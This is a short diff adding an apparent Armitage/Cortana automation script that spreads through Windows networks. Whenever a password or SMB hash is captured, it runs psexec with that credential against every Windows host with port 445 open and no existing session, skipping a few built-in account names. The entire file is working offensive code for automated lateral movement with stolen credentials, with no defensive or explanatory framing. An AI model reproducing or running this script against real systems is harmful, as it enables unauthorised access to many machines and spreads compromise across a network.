@@ -1,0 +1,22 @@
+on credential_add {
+	foreach $user(@("Guest", "HelpAssistant", "ASPNET", "SUPPORT_.*")) {
+		if($3 ismatch $user) {
+			return;
+		}	
+	}
+	
+	if($5 ismatch "(password|smb_hash)") {
+		psexec_attempt($3, $4);
+	}
+}
+
+sub psexec_attempt {
+	foreach $host (service_open(445)) {
+		if(host_os($host) eq "Microsoft Windows") {
+			if(size(host_sessions($host)) == 0) {
+				println("Attempting psexec on $host with $1\:$2");
+				psexec($host, "", $1, $2);
+			}
+		}
+	}
+}
